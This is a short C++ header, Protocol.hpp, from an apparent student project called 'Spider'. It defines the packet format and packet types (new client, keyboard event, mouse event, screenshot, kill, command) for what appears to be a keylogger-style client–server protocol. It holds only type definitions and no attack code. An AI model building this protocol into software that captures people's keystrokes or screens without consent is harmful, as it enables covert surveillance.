//
// Protocol.hpp for spider in /home/galibe_s/rendu/Spider/server/core
//
// Made by stephane galibert
// Login   <galibe_s@epitech.net>
//
// Started on  Tue Oct 18 19:17:41 2016 stephane galibert
// Last update Mon Oct 24 18:03:51 2016 stephane galibert
//

#pragma once

#include <stdint.h>

#define MAGIC_NUMBER 0x00ABCDEF
#define ERROR_DATA "Error 42: incorrect binary data"
#define ACCESS_DENIED "Error 43: access denied"

enum class PacketType : uint16_t
{
  PT_Error = 0,
  PT_Response = 1,
  PT_NewClient = 2,
  PT_KeyboardEvent = 3,
  PT_MouseEvent = 4,
  PT_Kill = 5,
  PT_Screenshot = 6,
  PT_Command = 7
};

struct Packet
{
  unsigned int MAGIC;
  PacketType type;
  int size;
  char data[0];
} __attribute__((packed));
